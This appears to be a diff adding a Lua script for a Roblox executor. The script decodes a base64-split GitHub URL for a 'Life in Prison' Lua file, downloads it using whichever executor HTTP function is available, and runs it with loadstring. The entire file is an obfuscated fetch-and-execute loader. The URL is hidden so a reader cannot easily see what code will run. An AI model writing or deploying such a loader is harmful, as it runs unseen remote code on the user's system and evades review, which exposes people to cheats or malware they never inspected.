@@ -1,0 +1,44 @@
+(function()
+    local function D(d)
+        local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+        d=d:gsub('[^'..b..'=]','')
+        return (d:gsub('.',function(x)
+            if x=='=' then return '' end
+            local r,f='',(b:find(x)-1)
+            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and'1'or'0') end
+            return r
+        end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)
+            if #x~=8 then return '' end
+            local c=0
+            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i)or 0) end
+            return string.char(c)
+        end))
+    end
+
+    local U={
+        "aHR0cHM6Ly9yYX",
+        "cuZ2l0aHVi",
+        "dXNlcmNvbnRl",
+        "bnQuY29tL0Fa",
+        "WXNHaXRodWIv",
+        "TGlmZUluUHJp",
+        "c29uUHJvamVj",
+        "dC9yZWZzL2hl",
+        "YWRzL21haW4v",
+        "TGlmZV9pbl9Q",
+        "cmlzb25fUHJv",
+        "amVjdC5sdWE="
+    }
+
+    local function G()
+        local u=D(table.concat(U))
+        if http_request then
+            return http_request({Url=u,Method='GET'}).Body
+        elseif request then
+            return request({Url=u,Method='GET'}).Body
+        else
+            return game:HttpGet(u)
+        end
+    end
+    loadstring(G())()
+end)()
